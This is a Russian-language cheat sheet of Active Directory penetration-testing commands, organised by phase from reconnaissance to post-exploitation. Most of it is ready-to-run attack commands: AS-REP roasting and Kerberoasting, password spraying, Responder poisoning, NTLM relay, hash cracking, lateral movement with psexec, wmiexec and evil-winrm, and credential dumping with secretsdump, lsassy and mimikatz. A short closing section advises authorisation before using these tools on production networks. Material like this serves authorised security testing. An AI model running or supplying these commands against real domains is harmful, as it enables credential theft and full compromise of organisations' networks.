# Active Directory PenTest — Cheatsheet

Коротко и по делу: быстрый набор команд и подсказок для каждой фазы тестирования AD.

---

## Быстрая установка (Kali) — минимально

```bash
sudo apt update
sudo apt install -y nmap smbclient smbmap hashcat john crackmapexec evil-winrm responder python3-impacket pipx golang git
python3 -m pip install --user pipx || true
python3 -m pipx ensurepath || true
export PATH="$HOME/.local/bin:$PATH"
# pipx для CLI-инструментов
pipx install enum4linux-ng || true
pipx install lsassy || true
# kerbrute через go
go install github.com/ropnop/kerbrute@latest
```

---

## Фаза 1 — Разведка

* Сканирование подсети (все TCP-порты):

```bash
nmap -sS -p- --min-rate 1000 -T4 -oA nmap/all_tcp 10.0.0.0/24
```

* Сбор информации по SMB / AD:

```bash
nmap -p 445 --script smb-os-discovery,smb-enum-shares,smb-protocols <IP>
crackmapexec smb <target/subnet> --shares --users --groups
enum4linux-ng <ip>
```

---

## Фаза 2 — Enumeration

* AS-REP roasting (GetNPUsers):

```bash
GetNPUsers.py domain/ -dc-ip <DC_IP> -format john -outputfile np.hash
```

* Kerberoast (GetUserSPNs):

```bash
GetUserSPNs.py -request -dc-ip <DC_IP> domain/ -outputfile spn.hash
```

* Сбор SharpHound (на Windows):

```powershell
Invoke-BloodHound -CollectionMethod All -Domain DOMAIN.LOCAL -ZipFileName data.zip
```

---

## Фаза 3 — Credential attacks

* Kerbrute — userenum / passwordspray:

```bash
kerbrute userenum --dc <DC_IP> -d domain.local users.txt
kerbrute passwordspray --dc <DC_IP> -d domain.local users.txt 'Password1!'
```

* Responder (только в тестовой сети):

```bash
sudo responder -I eth0 -r -d -w
```

* NTLM relay (импакт):

```bash
ntlmrelayx.py -t smb://<target> -smb2support -whitelist <ip>
```

* Брут хэшей (hashcat):

```bash
hashcat -m 13100 tgs.hash wordlist.txt
```

---

## Фаза 4 — Эксплуатация / Lateral movement

* WinRM (evil-winrm):

```bash
evil-winrm -i <IP> -u 'DOMAIN\\user' -p 'Passw0rd'
```

* psexec / wmiexec (impacket):

```bash
psexec.py DOMAIN/user:Pass@<IP>
wmiexec.py DOMAIN/user:Pass@<IP>
```

* CrackMapExec — быстрый launcher:

```bash
crackmapexec smb <subnet> -u user -p pass --exec-method smbexec
```

---

## Фаза 5 — Пост-эксплуатация

* secretsdump (impacket):

```bash
secretsdump.py domain/admin:Pass@<DC_IP>
```

* LSASS memory dump / lsassy (локально):

```bash
lsassy -u Administrator -p 'Passw0rd' -t <target_ip>
```

* mimikatz (нацеленный запуск на Windows):

```powershell
# скачай mimikatz.exe на машину и запусти с повышенными правами
mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" exit
```

---

## BloodHound — быстрый workflow

1. На Windows целевой запусти SharpHound (Collector) и собери .zip
2. Запусти neo4j и bloodhound на атакующей машине
3. Загрузите .zip в BloodHound GUI и анализируй пути эскалации

Команды (neo4j):

```bash
# в зависимости от версии neo4j — запусти сервис и открой http://localhost:7474
sudo systemctl start neo4j
```

---

## Полезные alias/шпаргалки

```bash
alias l4='ls -la'
alias ch='crackmapexec smb'
# Быстрая проверка impacket scripts
GetNPUsers.py --help
GetUserSPNs.py --help
```

---

## Предупреждения и best-practices

* Не использовать Responder, NTLM relay, password spray в продуктивной сети без согласования.
* Ограничь скорость атак (threads/delay) чтобы не блокировать учетные записи.
* Всегда сохраняй доказательства (логи, экспорт BloodHound, hash-файлы) с метками времени.

---

